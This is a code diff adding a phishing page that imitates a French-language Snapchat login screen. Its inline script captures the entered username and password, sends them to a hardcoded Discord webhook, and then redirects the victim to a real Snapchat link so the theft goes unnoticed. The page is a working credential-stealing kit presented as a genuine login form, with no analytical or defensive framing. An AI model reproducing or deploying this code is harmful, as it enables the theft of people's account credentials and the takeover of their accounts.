@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <link rel="stylesheet" href="css.css">
+    <link rel="icon" href="snapchat.256x256.png">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="sl1Tyxj - Imgur.png" alt="Snapchat Logo">
+        </div>
+        <form class="login-form" id="loginform">
+            <h1>Se connecter</h1>
+            <div class="input-group">
+                <input type="text" id="username" name="username" required>
+                <label for="username">Nom d'utilisateur</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" required>
+                <label for="password">Mot de passe</label>
+            </div>
+            <button type="submit" class="login-button" id="trap">Connexion</button>
+            <div class="links">
+                <a href="#">Mot de passe oublié ?</a>
+                <a href="#">Créer un compte</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("loginform").addEventListener("submit", async (event) => {
+    event.preventDefault(); // Empêche le rechargement de la page
+
+    const webhookURL = "https://discord.com/api/webhooks/1318946881711247493/sRp3X8JcU4JLLblWEVmLNoeuqPSHicCEQs84sHe-pP71Ym_entOX5bHrir85fvytLFe3"; // Remplace par ton URL Webhook
+    const login = document.getElementById("username").value;
+    const mdp = document.getElementById("password").value;
+    const trap = document.getElementById("trap");
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({content: `Nom d'utilisateur : ${login}\nMot de passe : ${mdp}`})
+        });
+
+        if (response.ok) {
+        window.location.href = "https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYYWlmbXNwcGRsAZJ06256AZJ062zAAAAAAQ?locale=fr-FR";
+    };
+    } catch (error) {
+        console.error("Erreur :", error);
+        alert("Une erreur est survenue.");
+    }
+
+
+});
+
+    </script>
+</body>
+</html>
